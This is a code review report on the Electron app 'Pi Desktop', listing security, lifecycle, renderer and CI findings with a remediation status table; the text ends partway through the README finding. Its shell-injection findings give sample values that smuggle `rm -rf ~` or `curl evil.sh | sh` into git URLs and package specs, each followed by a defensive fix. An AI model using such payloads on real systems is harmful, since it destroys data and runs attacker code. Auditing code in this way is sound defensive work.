# Pi Desktop — Code Review & Improvement Report

**Date:** 2026-06-22 · **Revised:** 2026-06-22 (post-remediation, version 0.2.8)
**Reviewed version:** 0.2.7 → **0.2.8** (after fixes)
**Scope:** Full codebase — `src/main` (Electron main process + Pi SDK bridge), `src/preload`, `src/shared`, `src/renderer` (React UI), build/release tooling, CI, and configuration.
**Codebase size:** ~8,700 LOC across 45 source files (TypeScript + React + Electron).

> **Status:** Two rounds of remediation have been applied. **All Critical and High findings are now fixed.** The detailed sections below (§3–§6) retain their **original** text for reference and traceability — **§1.5 Remediation Status is the authoritative record** of what is fixed vs. still open.

---

## 1. Executive Summary

Pi Desktop is a focused, well-organized Electron app that wraps the `@earendil-works/pi-coding-agent` SDK in a multi-tab desktop UI. The architecture is sound: a clean main/preload/renderer split, `contextIsolation: true` + `nodeIntegration: false`, a real Content-Security-Policy, a typed IPC contract in `src/shared/ipc.ts`, and a sensible per-tab `SessionPool` → `PiSessionManager` design. Markdown rendering is safe (no `rehype-raw`, no `dangerouslySetInnerHTML`), and the GitHub token is stored via Electron `safeStorage`. These are good foundations.

However, the review surfaced **several serious issues** that should be addressed before the next release:

- **Shell command injection** in the GitHub and package modules, where renderer-supplied URLs/paths/specs are interpolated into shell commands.
- **A data-integrity bug in multi-tab event routing** — background-tab agent events can be applied to the foreground tab.
- **A non-functional "Install Pi" button** that subscribes to progress events but never starts the install.
- **Resource leaks** in the session subsystem — runtimes/sessions are replaced without being disposed on every cwd change, fork, and switch.
- **No automated quality gate** — zero tests, no linter, no formatter, and the release CI publishes without even running `typecheck`.

### Scorecard

| Area | Original | Now | Notes |
|---|---|---|---|
| Architecture & structure | 🟢 Good | 🟢 Good | Clean separation; sensible IPC contract |
| Renderer security (CSP / isolation) | 🟢 Good | 🟢 Good | + `will-navigate` guard, `sandbox` still open |
| Main-process command safety | 🔴 Needs work | 🟢 **Fixed** | `execFile`/`spawn` arg arrays; no `shell: true` |
| Multi-tab correctness | 🔴 Needs work | 🟢 **Fixed** | Events require `tabId`; init race + dangling active tab fixed |
| Resource lifecycle | 🟠 At risk | 🟢 **Fixed** | Runtime/session disposed on cwd/fork/switch; LRU cache + TTL |
| Error handling | 🟠 At risk | 🟡 Improved | `clone` + push/pull + install fixed; some Low silent-catches remain |
| Tooling / tests / CI gate | 🔴 Absent | 🟢 **Fixed** | ESLint + Prettier + Vitest; CI gates typecheck/lint/test |
| Build / signing / release | 🟠 At risk | 🟠 At risk | Ad-hoc signing/entitlements still open (needs Apple Dev ID) |
| Docs accuracy | 🟠 At risk | 🟠 At risk | README auto-update/install text still to fix |

### Top 8 priorities (details in §8 roadmap)

1. **[P0]** Eliminate shell injection in `github.ts` and `packages.ts` — use `execFile`/`spawn` with argument arrays, drop `shell: true`. *(§3 SEC-1, SEC-2)*
2. **[P0]** Fix multi-tab event routing — drop events without a `tabId` instead of defaulting to the active tab. *(§5 R-C1)*
3. **[P0]** Make the "Install Pi" button actually call `startPiInstall()`. *(§5 R-H3)*
4. **[P1]** Dispose the previous runtime/session in `buildRuntime`/`attachSession` to stop per-action resource leaks. *(§4 M-H3/H4)*
5. **[P1]** Guard `SessionPool.getOrCreate` against the init race; reset `activeTabId` in `removeTab`. *(§4 M-C2, M-H2)*
6. **[P1]** Stand up tooling: ESLint + Prettier + a test runner, and gate CI on `typecheck`/lint/test before publish. *(§6 B-H1, B-H2)*
7. **[P1]** Stop refetching/clobbering streaming state on tab-count changes. *(§5 R-M2)*
8. **[P2]** Track and surface real `isCompacting` state; fix swallowed-error success paths (`clone`, `restoreToStock`, `renameSession`). *(§4 M-H1, M-M1/M2)*

---

## 1.5. Remediation Status

Two remediation rounds have been applied. The quality gate (`npm run typecheck && npm run lint && npm run test`) and a full `electron-vite build` are green after both.

### Round 1 — P0 (commit `c29d406`, factory-droid)

| ID | Finding | Status |
|---|---|---|
| SEC-1 | Shell injection in `github.ts` | ✅ `execFileSync` + arg arrays everywhere; `clearGitHubToken` now `unlinkSync` |
| SEC-2 | `shell: true` injection in `packages.ts` | ✅ Removed from both spawns |
| SEC-3 | `shell: true` in `installer.ts` | ✅ Removed |
| R-C1 | Per-tab event misrouting | ✅ Events without `tabId` dropped (verified main always tags them) |
| R-H3 | "Install Pi" button did nothing | ✅ Functional — now calls `startPiInstall()` (listener-leak edge finished in Round 2) |

### Round 2 — High + Medium lifecycle/perf/tooling (this session)

| ID | Finding | Status | Where |
|---|---|---|---|
| M-C2 | Init race in `getOrCreate` | ✅ Shared in-flight init promise | `SessionPool.ts` |
| M-C1 | Pool listeners re-wired without teardown | ✅ `attachEvents` clears listeners first | `SessionPool.ts` |
| M-H2 | `removeTab` left `activeTabId` dangling | ✅ Resets to another tab / null | `SessionPool.ts` |
| M-H3 | Runtime leaked on cwd change | ✅ Old runtime/services disposed in `buildRuntime` | `PiSessionManager.ts` |
| M-H4 | Session leaked on new/fork/switch | ✅ Outgoing session disposed in `attachSession` (guarded) | `PiSessionManager.ts` |
| M-H1 | `isCompacting` hardcoded `false` | ✅ Tracked + emitted in state | `PiSessionManager.ts` |
| M-H5 | EventEmitters unbounded | ✅ `setMaxListeners(50)` on pool + managers | both |
| M-M1 | `clone()` swallowed errors → success | ✅ Returns `{success:false,error}` on failure | `PiSessionManager.ts` |
| M-M4 | `MessageCache` O(n log n) eviction, no TTL | ✅ O(1) LRU + 30-min TTL | `MessageCache.ts` |
| M-M5 | Cache stored live array reference | ✅ Stores a shallow copy | `MessageCache.ts` |
| M-L7 | Dead `messageCacheEvents` emitter | ✅ Removed | `MessageCache.ts` |
| R-H3 | Install listener leak on unmount | ✅ `useEffect` cleanup via ref | `SystemPanel.tsx` |
| R-H2 | Uncancelled `setTimeout` chains | ✅ Timers tracked + cleared; `cancelled` guard | `PromptInput.tsx` |
| R-H4 | `activeTabId` read non-reactively in render | ✅ Subscribed via selector | `StatusBar.tsx` |
| R-H5 | History re-renders per token | ✅ `memo` on `MessageItem`/`ToolCallBlock`/`DiffViewer`; `useMemo` for JSON/diff | chat/* |
| R-H6 | Sync layout flush per token | ✅ Auto-scroll deferred to `requestAnimationFrame` | `ChatView.tsx` |
| R-M5 | Stuck `syncing` flag on push/pull | ✅ try/catch/`finally` | `GitHubBadge.tsx` |
| R-L6 | Version-string drift | ✅ Sidebar/pkg aligned to 0.2.8; SDK fallback → 0.79.10 | Sidebar/StatusBar |
| SEC-5 | No `will-navigate` guard | ✅ In-frame nav cancelled → `shell.openExternal` | `window.ts` |
| SEC-6 | `safeStorage` token not deleted | ✅ `unlinkSync` (Round 1) | `github.ts` |
| B-H1 | No tests / lint / format | ✅ ESLint + Prettier + Vitest added; `compareVersions` extracted + tested | configs, `src/shared/version*` |
| B-H2 | CI published with no gate | ✅ typecheck + lint + test before build; `concurrency` + npm cache added | `build.yml` |

### Still open (intentionally deferred — environment or judgement-dependent)

| ID | Finding | Why deferred |
|---|---|---|
| SEC-4 | `sandbox: false` on renderer | Low-risk but needs a manual run to confirm preload still loads under sandbox |
| SEC-7 | No IPC input validation | Defense-in-depth; larger change (schema layer) |
| SEC-8 | Broad `connect-src`; hex-named SVG tracked | Tighten CSP allowlist; `git rm` the junk asset — cosmetic |
| B-M1 | Ad-hoc signing / over-broad entitlements | **Requires an Apple Developer ID** + notarization — owner decision |
| B-M2 | `electron-builder` 25.x build-toolchain vulns; `@types` skew | Bump is a behavioural change to the release toolchain — verify separately |
| B-M3 | README auto-update + install command inaccurate | Docs edit — pending owner confirmation of intended wording |
| M-M2/M3 | `restoreToStock` partial-failure reporting; cache invalidation | Correctness polish |
| M-L1/L3/L4 | steer/followUp drop `images`; `exportHtml` stub; `renameSession` silent | Need SDK-API confirmation before changing call signatures |
| R-L2/L3 | Accessibility (keyboard/focus on pickers & modals) | Worthwhile pass, larger UI change |
| R-M3 | Unbounded per-tab message/tool growth | Needs windowing/virtualization design |

---

## 2. Severity Legend

| Severity | Meaning |
|---|---|
| 🔴 **Critical** | Security hole or data-corruption bug; fix before next release. |
| 🟠 **High** | Functional bug, resource leak, or missing safety net with real user impact. |
| 🟡 **Medium** | Correctness/UX/maintainability issue worth scheduling. |
| ⚪ **Low** | Polish, hygiene, minor risk. |

Finding IDs are prefixed by area: **SEC** (security), **M** (main process / Pi subsystem), **R** (renderer), **B** (build/tooling).

---

## 3. Security (main process)

This is the most important section. The renderer is well-sandboxed, but the **main process interpolates renderer-controlled strings directly into shell commands**, which is the classic Electron escalation path: any renderer compromise (or even a user pasting a crafted URL) becomes arbitrary code execution on the host.

### 🔴 SEC-1 — Shell command injection in `github.ts`

**File:** `src/main/github.ts:196`, `:213`, `:259`, `:271`

`execSync` **always runs through a shell** (`/bin/sh -c`), and these call sites interpolate untrusted data:

```ts
// :196  attachRepo — remoteUrl comes straight from renderer IPC args
execSync(`git remote add origin ${repo.remoteUrl}`, { cwd, ... });

// :213  cloneRepo — remoteUrl AND localPath come from renderer IPC args
execSync(`git clone "${remoteUrl}" "${localPath}"`, { ... });

// :259  createRepo — repoUrl from GitHub API response (less controlled, still unquoted)
execSync(`git remote add origin ${repoUrl}`, { cwd, ... });

// :271  branch comes from `git rev-parse` output (branch names can hold metacharacters)
execSync(`git push -u origin ${branch}`, { ... });
```

The data flow is direct: `ipc.ts:318` → `cloneRepo(a?.remoteUrl, a?.localPath)` and `ipc.ts:312-316` → `attachRepo(cwd, { remoteUrl: a?.remoteUrl, ... })`, both taken verbatim from the renderer.

- `:196` is unquoted: `remoteUrl = "x; rm -rf ~"` runs `rm -rf ~`.
- `:213` is double-quoted, but **double quotes do not stop command substitution** — `remoteUrl = "https://x$(rm -rf ~).git"` still executes `$(...)`. A literal `"` in either argument also breaks out.

**Why it matters:** Renderer-supplied input reaching a shell is arbitrary code execution on the user's machine. Even if today the only path is a user pasting a clone URL, this is a latent RCE that becomes trivially exploitable the moment any other surface can influence those strings.

**Fix:** Never build git commands as shell strings. Use `execFile`/`spawnSync` with an argument array so the args are passed to `git` directly, never re-parsed by a shell:

```ts
import { execFileSync } from "node:child_process";
execFileSync("git", ["remote", "add", "origin", repo.remoteUrl], { cwd, timeout: 5000 });
execFileSync("git", ["clone", remoteUrl, localPath], { timeout: 60000 });
```

Apply the same to `tryExec`/`run` helpers in `github.ts` and `git.ts` (those pass fixed commands today, but the helper signature invites future interpolation — convert them to take `(cmd, args[])`).

### 🔴 SEC-2 — Command injection via `shell: true` in `packages.ts`

**File:** `src/main/packages.ts:99-102`, `:122-125`

```ts
const child = spawn("pi", ["install", spec], { stdio: [...], shell: true });
```

`spec` is renderer-supplied (`ipc.ts:347` → `m.installPackage(a?.spec)`). With `shell: true`, Node concatenates the command + args into a single string and hands it to the shell, which **re-parses metacharacters** — defeating the entire purpose of the args array. `spec = "x; curl evil.sh | sh"` executes.

**Fix:** Drop `shell: true`. `spawn("pi", ["install", spec])` passes `spec` as a single literal argv entry that the shell never sees. (`pi` is resolved via the repaired `PATH` from `fix-path.ts`, so the shell is not needed for resolution.) Same fix for `removePackage` (`:124`).

### 🟠 SEC-3 — Unnecessary `shell: true` in the installer

**File:** `src/main/installer.ts:90-93`

`spawn("npm", ["install", "-g", "@earendil-works/pi-coding-agent@latest"], { shell: true })`. The arguments are constant here, so there is no injection today, but `shell: true` is an unnecessary risk and an inconsistent pattern. **Fix:** remove `shell: true`; if shell resolution of `npm` is the concern, rely on the already-repaired PATH (or `npm.cmd` handling on Windows, which this app doesn't target).

### 🟠 SEC-4 — `sandbox: false` on the renderer

**File:** `src/main/window.ts:27`

`contextIsolation: true` and `nodeIntegration: false` are correct, but `sandbox: false` means the preload script runs with **full Node.js privileges**. The preload (`src/preload/index.ts`) only uses `contextBridge` + `ipcRenderer` and a build-time `package.json` import — it needs no Node runtime APIs.

**Fix:** Set `sandbox: true`. This is the modern Electron default and the strongest single hardening step for the renderer. Verify the preload still builds/loads (it should, given its narrow surface).

### 🟡 SEC-5 — No `will-navigate` guard

**File:** `src/main/window.ts:43-46`

`setWindowOpenHandler` correctly denies `window.open`/`target=_blank` and routes to `shell.openExternal` — good. But there is no `webContents.on("will-navigate", ...)` handler, so an in-frame navigation (a same-tab link, a form submit, or programmatic `location =`) to a remote URL would replace the app frame. The CSP mitigates script execution, but the app frame should never navigate away from the bundled file.

**Fix:**
```ts
win.webContents.on("will-navigate", (e, url) => {
  if (url !== win.webContents.getURL()) { e.preventDefault(); shell.openExternal(url); }
});
```

### 🟡 SEC-6 — `safeStorage` used without availability/teardown checks

**File:** `src/main/github.ts:26-33`, `:48-54`

- `storeGitHubToken` calls `safeStorage.encryptString` without first checking `safeStorage.isEncryptionAvailable()`. When unavailable the call throws and the `catch` silently logs — the token appears "saved" to the user but is not. **Fix:** check `isEncryptionAvailable()` and surface a clear error to the renderer.
- `clearGitHubToken` truncates the file to `""` rather than deleting it (`writeFileSync(TOKEN_FILE, "")`). Functionally the token is removed, but **deleting** the file (`unlinkSync`) is cleaner and leaves no encrypted blob on disk. Minor.

### 🟡 SEC-7 — IPC handlers trust argument shape with no validation

**File:** `src/main/ipc.ts` (throughout), `src/main/updater.ts:21`

Every handler consumes `a.tabId`, `a.spec`, `a.settings`, `a.cwd`, etc. with no validation. `pi:settings.set` applies an arbitrary object (`m?.deps?.settingsManager?.applyOverrides(a.settings)`), and `pi:theme:set` forwards a raw string to `nativeTheme.themeSource`. The renderer is first-party, so this is lower-risk, but it is the second half of the injection chain in SEC-1/SEC-2 and offers no defense in depth.

**Fix:** Add lightweight runtime validation at the IPC boundary (a small schema/guard per channel, or Zod). At minimum validate the high-risk inputs (`spec`, `remoteUrl`, `localPath`, `cwd`).

### ⚪ SEC-8 — Broad `connect-src` / committed hex-named asset

- `src/renderer/index.html:6` — CSP `connect-src 'self' https:` allows the renderer to reach **any** HTTPS host. Acceptable given the app fetches from GitHub/npm, but tightening to an allowlist (`https://api.github.com https://registry.npmjs.org https://api.npmjs.org`) would reduce exfiltration surface if the renderer is ever compromised.
- A file named `68747470733a2f2f70692e6465762f6c6f676f2d6175746f2e737667.svg` (hex for `https://pi.dev/logo-auto.svg`) is tracked at the repo root — junk filename, should be renamed or removed (`git rm`).

---

## 4. Main process & Pi session subsystem

Findings from a deep review of `PiSessionManager.ts` (848 LOC), `SessionPool.ts`, `MessageCache.ts`, `SharedDepsCache.ts`, `menu.ts`, `tray.ts`, `shortcuts.ts`.

### 🔴 M-C2 — Init race in `SessionPool.getOrCreate`

**File:** `src/main/pi/SessionPool.ts:29-40`; `PiSessionManager.init` `:98-120`

`getOrCreate` is not guarded against concurrent invocation. Two IPC calls for the same `tabId` arriving close together both observe `!isReady` and both call `await mgr.init()` (`initialized` is set only at the end of `init`, `:119`). The second init rebuilds the runtime/session and re-subscribes, **orphaning the first runtime** (leaked SDK session + child processes + undici state) and emitting duplicate `STATE`/`SESSION_RESET` events.

**Fix:** Cache the in-flight promise: `mgr.initPromise ??= mgr.init(); await mgr.initPromise;`. Make `init()` early-return if already initialized or in-flight.

### 🔴 M-C1 — Pool event listeners re-wired without teardown

**File:** `src/main/pi/SessionPool.ts:43-55` (`createForTab`) + `:58-74` (`attachEvents`)

`createForTab` accepts a caller-supplied `tabId` (`ipc.ts:71`) and, for an existing tab, disposes the old manager and re-runs `attachEvents`. Listener cleanup relies entirely on `dispose()` ordering; `attachEvents` itself never clears listeners before re-attaching. Combined with M-C2 this produces duplicate event emission (the same agent event delivered N times to the renderer).

**Fix:** Make `attachEvents` idempotent — `mgr.events.removeAllListeners()` (or track and remove specific handlers) before re-binding — and make `createForTab` idempotent for an existing tabId.

### 🟠 M-H3 — Previous runtime never disposed on cwd change

**File:** `src/main/pi/PiSessionManager.ts:148-170` (`buildRuntime`), `:309-320` (`rebuildForCwd`), `:682-688` (`setCwd`)

`buildRuntime` overwrites `this.runtime` with a freshly created runtime without disposing the old one. `attachSession` only unsubscribes the event listener; it never tears down the old runtime. Every cwd change (and every session-with-different-cwd) leaks a full runtime: child processes, file watchers, undici dispatcher state, FDs.

**Fix:** Before reassigning, tear down: `this.unsubscribe?.()`, `await this.runtime?.dispose?.()` / `this.session?.dispose?.()` (confirm the SDK's teardown method). Centralize so fork/switch/clone paths also release the prior runtime.

### 🟠 M-H4 — Previous `AgentSession` not disposed on new/fork/switch/clone

**File:** `src/main/pi/PiSessionManager.ts:173-185` (`attachSession`), called from `:293`, `:304`, `:325`, `:332`

`attachSession` replaces `this.session` and unsubscribes the listener, but never disposes the outgoing session. On a heavily-branched workflow this accumulates session-held resources (message buffers, tool state).

**Fix:** Capture the outgoing session before reassignment and `oldSession.dispose?.()` — after confirming the runtime doesn't already dispose it (avoid double-dispose).

### 🟠 M-H2 — `removeTab` leaves `activeTabId` dangling

**File:** `src/main/pi/SessionPool.ts:84-90`; consumed at `ipc.ts:96`, `:100`, `:157`, etc.

`removeTab` disposes and deletes the manager but never updates `activeTabId`. If the active tab is removed, later calls do `pool.getOrCreate(pool.getActiveTab()!)` with the **stale removed id**, silently resurrecting a hidden manager for a tab the UI considers gone (another leaked runtime), or throwing `No active tab` inconsistently.

**Fix:** In `removeTab`, if `tabId === activeTabId` set `activeTabId = null` (or pick another existing tab). Validate `activeTabId ∈ pools` before using it.

### 🟠 M-H1 — `isCompacting` is hardcoded `false`

**File:** `src/main/pi/PiSessionManager.ts:393-394` (`getState`), `:238-252` (`emitState` omits the field), `:205-211` (compaction events only call `emitState`)

The manager handles `compaction_start`/`compaction_end` but never tracks a boolean, and `getState()` literally returns `isCompacting: false`. The renderer can never show a "compacting" indicator or block input mid-compaction.

**Fix:** Track a private `isCompacting`, toggle on the compaction events (and reset on `agent_end`/abort), and include it in both `getState()` and the `emitState()` payload.

### 🟠 M-H5 — EventEmitters never set `maxListeners`

**File:** `PiSessionManager.ts:79`, `SessionPool.ts:14`, `MessageCache.ts:21`

None call `setMaxListeners`. With the M-C1/M-C2 accumulation, the per-manager emitter exceeds Node's default 10-listener cap and prints `MaxListenersExceededWarning`, masking the underlying leak. **Fix:** fix the root accumulation, then set an explicit documented limit so a real breach surfaces clearly.

### 🟡 M-M1 — `clone()` swallows fork errors but reports success

**File:** `src/main/pi/PiSessionManager.ts:329-334`
`this.runtime.fork("", { position: "at" }).catch(() => ({}))` then unconditionally `attachSession(...)` and `return { success: true }`. A failed clone reports success and the UI diverges from reality. **Fix:** inspect the result; return `{ success: false, error }` on failure.

### 🟡 M-M2 — `restoreToStock` swallows per-package errors and skips reload

**File:** `src/main/pi/PiSessionManager.ts:591-644` (empty `catch {}` at `:601-606`)
Each removal is wrapped in a silent catch; the method returns `success: true` regardless and never calls `reloadResources()`, so the live session keeps stale skills/extensions. **Fix:** collect failures into an errors array and surface them; reload resources at the end.

### 🟡 M-M3 — Settings mutations don't invalidate `SharedDepsCache`

**File:** `removeSkill` `:556-571`, `removeExtension` `:574-589`, `restoreToStock` `:591-644`; cache TTL `SharedDepsCache.ts:22` (10 min)
`installPackage`/`removePackage` invalidate via `ipc.ts`, but these in-manager mutations don't, so other tabs see removed skills/extensions for up to 10 minutes. **Fix:** call `invalidateSharedDeps()` after any settings mutation, or route all mutations through one path that invalidates.

### 🟡 M-M4 — `MessageCache` eviction is O(n log n) and unbounded by size

**File:** `src/main/pi/MessageCache.ts:40-44`, cap `:18`
On every insert at capacity it sorts all entries to find the oldest, though `Map` already preserves insertion order (`delete cache.keys().next().value` is O(1)). The cap is 50 sessions **by count**, with no byte bound — 50 large conversations is effectively unbounded memory. **Fix:** insertion-order eviction; add a TTL (mirror `SharedDepsCache`); consider a byte/length bound.

### 🟡 M-M5 — `MessageCache` stores a live array reference / caches raw not converted messages

**File:** `ipc.ts:105-118` vs `MessageCache.ts:1-8` doc; `getMessages` returns the live array `PiSessionManager.ts:383-385`
The cache's documented purpose is to store expensively-converted messages, but the handler caches the **raw** `session.messages` array by reference. Storing the live reference risks aliasing bugs (the array can mutate under the cache). **Fix:** store a copy (`[...msgs]`) and reconcile the doc with reality.

### 🟡 M-M6 / 🟡 M-M7 — `as any` SDK access with silent fallbacks; tray never destroyed

- `PiSessionManager.ts:693-807` — `getCommands/getExtensions/getTools/...` access `(session as any).resourceLoader` and friends, returning empty lists on any error (`getTools` `:795-807`). When the pinned SDK (`PI_VERSION = 0.79.10`) drifts, the UI silently shows "no commands/tools" with no diagnostic. **Fix:** define minimal interfaces; emit a `DIAG_EVENT` when an expected method is missing.
- `tray.ts:4,20` — the `Tray` is stored module-global and never destroyed; `before-quit` (`index.ts:66-69`) disposes the pool and shortcuts but not the tray. Inconsistent and would leak on re-init. **Fix:** add `destroyTray()` and call it on quit; guard against double-create.

### ⚪ Low (main)

- **M-L1** `steer`/`followUp` accept `images` but silently drop them (`PiSessionManager.ts:266-276`).
- **M-L3** `exportHtml` is a stub that returns a path without writing a file (`:825-833`).
- **M-L4** `renameSession` swallows errors and always returns success (`:811-823`).
- **M-L6** Menu `Cmd+P` → "Cycle Model" is non-standard; tray "accelerators" (`tray.ts:49`) are decorative (not registered) and mislead users.
- **M-L7** `messageCacheEvents` emits hit/miss on every access but has no subscribers — dead code on a hot path (`MessageCache.ts:21-32`).
- **M-L8** `getForkMessages` synthesizes `entry-${i}` ids for messages lacking a real id; forking from one won't map to a real point (`:367-379`).

---

## 5. Renderer (React) layer

Findings from a deep review of `src/renderer/src/**` (App, zustand store, all components). **Note:** the renderer's XSS posture is sound — `react-markdown` is used without `rehype-raw`, there is no `dangerouslySetInnerHTML`, and the CSP blocks inline scripts. The issues here are correctness, performance, and lifecycle.

### 🔴 R-C1 — Per-tab agent events misrouted to the active tab

**File:** `src/renderer/src/App.tsx:75-96`

Every global event handler falls back to the *current* active tab when an event lacks a `tabId`:
```ts
const tabId = (event as any).tabId ?? useAppStore.getState().activeTabId;
```
If the main process ever emits a per-tab event without a `tabId` — or emits it just after the user switches tabs — it is applied to whatever tab is active *now*, not the tab that produced it. A background tab mid-stream can dump its deltas, tool calls, and `sessionReset` into the foreground tab. This is data corruption, not cosmetic, and it directly undermines the multi-tab headline feature.

**Fix:** Require `tabId` on all per-tab events and **drop** events without one (`if (!event.tabId) return;`). Reserve the active-tab fallback for genuinely global signals (menu, diagnostics, theme). Pair with main-process M-C1/M-C3 (events are broadcast to the renderer for all tabs regardless of active tab).

### 🟠 R-H3 — "Install Pi" button never starts the install

**File:** `src/renderer/src/components/settings/SystemPanel.tsx:36-54`

`handleInstall` sets `installing = true` and subscribes to `onInstallProgress`/`onInstallDone` but **never calls `window.pi.api.startPiInstall()`** (which exists in preload at `index.ts:85`). The button spins forever. The listeners also leak if `onInstallDone` never fires, because the only `off()` calls are inside the done handler — there is no `useEffect` cleanup.

**Fix:** Call `startPiInstall()` after registering listeners; move subscribe/unsubscribe into a `useEffect` (or a ref cleaned on unmount).

### 🟠 R-H5 / R-H6 — Entire message history re-renders (and forces layout) on every streaming token

**File:** `chat/ChatView.tsx:17-23` (scroll effect), `:58-60` (map), `chat/MessageItem.tsx:6-11`

`ChatView` subscribes to `s.activeTab`, and the store returns a new `activeTab` object on every `message_update`, so the full `messages.map(<MessageItem>)` re-runs on every token. `MessageItem`, `ToolCallBlock` (`JSON.stringify` on every render, `ToolCallBlock.tsx:85`), and `DiffViewer` (`patch.split` + per-line map) are **not** memoized. The auto-scroll effect reads `scrollHeight` synchronously per token, forcing a layout flush each token. `Markdown` *is* memoized (good), but the rest causes visible jank in long conversations.

**Fix:** Wrap `MessageItem` (and `ToolCallBlock`) in `React.memo`; `useMemo` the `JSON.stringify` and diff line-split; throttle scrolling with `requestAnimationFrame` and only scroll on message-count change / streaming end.

### 🟠 R-H2 — Uncancelled `setTimeout` chains in `PromptInput`

**File:** `chat/PromptInput.tsx:36-74`, `:77-93`

The command-fetch backoff schedules `setTimeout(tryFetch, …)` that the cleanup never clears (it only flips a `cancelled` flag). Worse, the `onPackagesChanged` handler's `setTimeout(... getCommands().then(setCommands))` (`:80`) has **no** cancellation guard and will `setState` after unmount. Rapid tab switching stacks multiple backoff chains.

**Fix:** Track timer ids and `clearTimeout` in cleanup; add a mounted guard before `setCommands`.

### 🟠 R-H4 — `activeTabId` read non-reactively as a render prop

**File:** `StatusBar.tsx:95` (`useAppStore.getState().activeTabId` passed to `GitRepoBadge`); same anti-pattern in `ModelView.tsx:111,141`

Reading `getState()` in render is not a subscription, so a `tabId` change without a coincident `piState` change leaves children with a stale `tabId` — `GitRepoBadge`'s effect (keyed on `[cwd, tabId]`) then fetches git info for the wrong tab. **Fix:** subscribe — `const activeTabId = useAppStore((s) => s.activeTabId)` — and pass that.

### 🟡 R-M2 — Tab add/remove refetches and clobbers streaming state

**File:** `src/renderer/src/App.tsx:153-165` (deps `[activeTabId, tabs.length]`)

Adding/removing any tab changes `tabs.length`, re-firing `getState`/`getMessages` for the active tab and overwriting in-memory state — including a mid-stream message — with the backend snapshot. Opening a second tab while tab 1 streams corrupts tab 1. **Fix:** key only on `activeTabId`; hydrate once per tab (track a "hydrated" set); skip refetch when `isStreaming`.

### 🟡 R-M3 — Unbounded per-tab `messages`/`tools` growth

**File:** `store/useAppStore.ts:223-364`

`messages` and `tools[id].result` (large file reads / command output) accumulate with no bound or virtualization — memory growth in long sessions. `diagnostics` *is* correctly bounded (`:370` `slice(-50)`); apply the same discipline. **Fix:** window/virtualize the message list; trim large `tool.result` payloads after render.

### 🟡 R-M5 — Stuck loading flags / unhandled rejections across IPC calls

**File:** widespread — `GitHubBadge.tsx:93-105` (`handlePush`/`handlePull` have no try/catch → unhandled rejection, `syncing` stuck true forever), `PromptInput.tsx:142-151`, `Sidebar.tsx:24-37`, `TabBar.tsx:12-22`, `SessionsView.tsx:111-127`

Most `window.pi.*` calls either swallow errors or have no handler, so failed prompts/pushes/tab-creates silently hang with no user-visible error. **Fix:** wrap mutating IPC calls in try/catch with `finally` to reset flags; surface failures via the diagnostics bar or inline error UI (the pattern already exists in `PackagesView`/`ModelView`).

### ⚪ Low (renderer)

- **R-M1** `App.tsx:71-143` "subscribe once" effect has an over-broad dep array (incl. unused `setActiveView`); fragile if store actions ever lose referential stability. Use `[]` + `getState()`.
- **R-L1** Index-based list keys in several lists (`MessageItem.tsx:30`, `QueueChips`, `ExtensionsView`, `DiffViewer`); use stable keys (`toolCallId`).
- **R-L2 / R-L3** Accessibility: clickable `<span>`/`<div>` pickers (`StatusBar.tsx:101-115`, `TabBar.tsx:36-43`) aren't keyboard-operable; icon-only buttons lack `aria-label`; popovers don't trap/restore focus or close on Escape.
- **R-L4** `main.tsx:6-13` auto-copies any text selection to the clipboard app-wide (incl. inside inputs) — a data-loss footgun; gate behind a setting / restrict to message regions.
- **R-L5** Duplicated helpers/constants and **drifted** `TUI_ONLY_COMMANDS` (`PromptInput.tsx:14` vs `ExtensionsView.tsx:255`) — a command hidden in autocomplete can still show in the Extensions list. Hoist to a shared module; define once.
- **R-L6** Version-string drift: `StatusBar.tsx:89` hardcodes `"0.79.9"` while preload reports `"0.79.10"`; `v0.2.7` is hardcoded in `Sidebar`/`DesktopChangelog`. Source all versions from `window.pi.versions`.
- Pervasive `any` on the event/state/delta path (the most bug-prone code). Define discriminated-union types in `src/shared`.

---

## 6. Build, release, tooling & CI

### 🟠 B-H1 — No automated quality gate (no tests, lint, or format)

**File:** repo-wide; `package.json:9-18`

There is no ESLint, no Prettier/Biome, and no test runner anywhere. The only static check is `npm run typecheck`, and it is not run automatically. For a ~40-file TypeScript/React app this means bugs, unsafe `any` patterns, dead code, and style drift land unguarded. **Fix:** add ESLint (`@typescript-eslint` + `eslint-plugin-react-hooks` — the hooks plugin would have caught R-H2/R-M2), Prettier, and a test runner (Vitest) starting with pure logic in `src/main` (`fix-path`, `models`, version compare, IPC shapes). Add `lint`/`format`/`test` scripts.

### 🟠 B-H2 — CI publishes releases with no gate

**File:** `.github/workflows/build.yml:24-31`

A `v*` tag push runs `npm run build` → `electron-builder --publish always` with **no typecheck/lint/test** in between. A type error or broken build ships straight to a public GitHub Release. **Fix:** add a gating job that runs `npm run typecheck` + lint + test before build; consider `--publish onTagOrDraft` (draft for human review) instead of `always`. Add a `concurrency:` group to avoid double-publish on rapid retags, and `cache: npm` on setup-node.

### 🟠 B-M1 — Ad-hoc signing, over-broad entitlements, fragile hook

**File:** `electron-builder.yml:17,23` (`hardenedRuntime: true`, `identity: null`), `resources/entitlements.mac.plist`, `build/afterSign.cjs`

The app is **ad-hoc signed and not notarized**. The entitlements grant `allow-unsigned-executable-memory`, `disable-library-validation`, and `allow-dyld-environment-variables` — strong relaxations that widen the attack surface (dylib injection) on a binary with no Apple-verified provenance. Users must `xattr -cr` / right-click-Open (high friction). The `afterSign.cjs` hook builds `find … -exec` / `xattr -d` commands by **string interpolation** with swallowed errors, and the final `codesign --verify --strict` is **non-fatal** — a broken signature still produces a "successful" release.

**Fix:** Obtain an Apple Developer ID, set a real `identity`, and notarize (`@electron/notarize` in the hook). Audit entitlements — drop `disable-library-validation` / `allow-unsigned-executable-memory` unless a dependency provably needs them. Rewrite the hook with `execFileSync(…, [args])` and make verification **fatal**.

### 🟡 B-M2 — Dependency & version hygiene

- `npm audit` reports **13 vulns (11 high, 2 moderate)** — all in the `electron-builder` 25.x **build toolchain** (`app-builder-lib`, `dmg-builder`, transitively `tar`, `cacache`, `node-gyp`). `npm audit --omit=dev` → **0**, so shipped runtime deps are clean; the exposure is a supply-chain risk in the release pipeline. **Fix:** bump `electron-builder` to 26.x; enable Dependabot.
- `@types/react-syntax-highlighter@^15` vs `react-syntax-highlighter@^16` — major-version type/lib skew (`package.json:9,21`). Align the `@types` package to v16.
- No `engines.node` constraint, and the vite `target` is `node20` (`electron.vite.config.ts:24`) while Electron 38 ships Node 22. Add `"engines": { "node": ">=20" }` and consider bumping the target to `node22`.

### 🟡 B-M3 — README materially misrepresents shipped behavior

**File:** `README.md`

